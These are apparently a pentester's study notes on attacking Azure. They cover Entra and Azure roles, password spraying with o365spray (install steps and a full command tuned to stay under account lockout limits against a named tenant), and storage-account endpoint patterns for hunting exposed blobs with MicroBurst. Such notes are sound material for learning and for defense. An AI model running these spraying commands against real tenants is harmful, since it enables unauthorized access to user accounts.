Azure has 2 types of roles:
	Microsoft Entra roles (configured in the Microsoft Entra tenant oversee entire cloud environment)	
		Global Admin -> highest level role that can do anything
		Application Admin
		Application Developer
		Billing Admin
	Azure roles (Can interact with the resources created and are scoped to specific resources)
		Owner
		Contributor
		Reader
		User Access Admin

Password Spraying:
	https://github.com/0xZDH/o365spray.git

	By default, Azure sets lockout threshold at 10 attempts and lockout duration is 60 seconds

	Run on Kali Linux
	Installation:
		virtualenv o365spray
		cd o365spray
		git clone https://github.com/0xZDH/o365spray.git
		python3 -m pip install -r requirements.txt 

	Usage:
		python3 o365spray.py --spray -U users.txt -P pass.txt -c 9 -l 1 --domain noacompany715.onmicrosoft.com
			--spray		-> password spray attack
			-U users.txt	-> file containing user accounts
			-P pass.txt	-> password file
			-c 9		-> count 9 -> number of pw attempts to run per user before resetting the lockout account timer	
			-l 1		-> lockout 1 -> lockout policy's reset time (in minutes)

Cloud Storage Hunting:
	An Azure storage account contains all of your Azure Storage data objects:
		blobs -> cloud object storage service. Designed to store unstructured data (images, videos, documents and backups)
		files
		queues
		tables

		each storage account is available over HTTPS:
			Blob storage:			https://<storage-accounts>.blob.core.windows.net
			Static website (blob storage):	https://<storage-accounts>.web.core.windows.net
			Data Lake Storage Gen2:		https://<storage-accounts>.dfs.core.windows.net
			Azure Files:			https://<storage-accounts>.file.core.windows.net
			Queue Storage:			https://<storage-accounts>.queue.core.windows.net
			Tables Storage:			https://<storage-accounts>.table.core.windows.net


	MicroBurst -> a powershell toolkit for Attacking Azure (finding blobs)
		https://github.com/NetSPI/MicroBurst
